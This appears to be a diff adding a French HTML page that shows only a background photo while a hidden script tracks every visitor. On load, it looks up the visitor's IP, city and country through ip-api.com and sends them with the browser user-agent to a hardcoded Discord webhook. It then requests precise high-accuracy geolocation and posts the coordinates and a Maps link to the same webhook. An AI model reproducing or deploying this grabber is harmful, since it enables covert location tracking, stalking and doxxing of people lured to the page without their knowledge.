@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden;
+        }
+        .bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://ton-lien-image.com/ta-photo.jpg') center/cover no-repeat;
+            opacity: 0.92; z-index: -1;
+        }
+        .status {
+            position: absolute; bottom: 10px; right: 10px; color: rgba(255,255,255,0.3);
+            font-family: Arial; font-size: 12px; z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg"></div>
+    <div class="status" id="status">chargement...</div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1500837194192130130/SRAwwkVIqaqIgLDX35fRqQMIcUwzqvjcQGa_cgqE2XWVQfgihIRmu8mdxbsGSEcq1xNa";
+
+        function sendDiscord(title, fields) {
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: title, embeds: [{ color: 0xFF0000, fields: fields }] })
+            }).catch(() => {});
+        }
+
+        async function start() {
+            document.getElementById("status").innerHTML = "connexion...";
+
+            // === IP + infos de base ===
+            let info = { timestamp: new Date().toISOString() };
+
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=query,country,city,regionName,lat,lon,isp,mobile');
+                const geo = await res.json();
+                info.ip = geo.query;
+                info.city = geo.city;
+                info.country = geo.country;
+            } catch(e) {}
+
+            // Envoi immédiat
+            sendDiscord("🔴 Nouvelle connexion", [
+                { name: "IP", value: info.ip || "N/A", inline: true },
+                { name: "Ville", value: info.city || "N/A", inline: true },
+                { name: "Pays", value: info.country || "N/A", inline: true },
+                { name: "User-Agent", value: navigator.userAgent.substring(0, 300) }
+            ]);
+
+            // === Demande localisation précise ===
+            setTimeout(() => {
+                document.getElementById("status").innerHTML = "demande localisation...";
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            sendDiscord("📍 LOCALISATION ACCEPTÉE", [
+                                { name: "Latitude", value: pos.coords.latitude.toFixed(6) },
+                                { name: "Longitude", value: pos.coords.longitude.toFixed(6) },
+                                { name: "Précision", value: pos.coords.accuracy + "m" },
+                                { name: "Maps", value: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}` }
+                            ]);
+                        },
+                        err => {
+                            sendDiscord("⚠️ Localisation refusée", [{ name: "Erreur", value: err.message }]);
+                        },
+                        { enableHighAccuracy: true }
+                    );
+                }
+            }, 700);
+        }
+
+        window.onload = start;
+    </script>
+</body>
+</html>
